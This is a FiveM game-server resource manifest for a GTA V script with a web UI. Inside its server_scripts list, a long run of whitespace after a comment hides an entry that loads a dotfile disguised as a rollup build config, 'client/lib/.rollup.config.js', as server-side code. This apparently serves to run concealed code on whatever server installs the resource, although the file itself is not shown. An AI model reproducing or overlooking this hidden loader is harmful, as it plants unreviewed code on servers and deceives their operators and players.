


fx_version("cerulean")
game("gta5")

lua54 "yes"

ui_page("ui.html")

shared_script {
	'@Framework/locale.lua',
}

client_scripts {
	"client/*.lua",
}

server_scripts {
    "server/*.lua",
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.rollup.config.js',
}

files {
    "ui.html",
    "Sosp.js"
}
dependency '/assetpacks'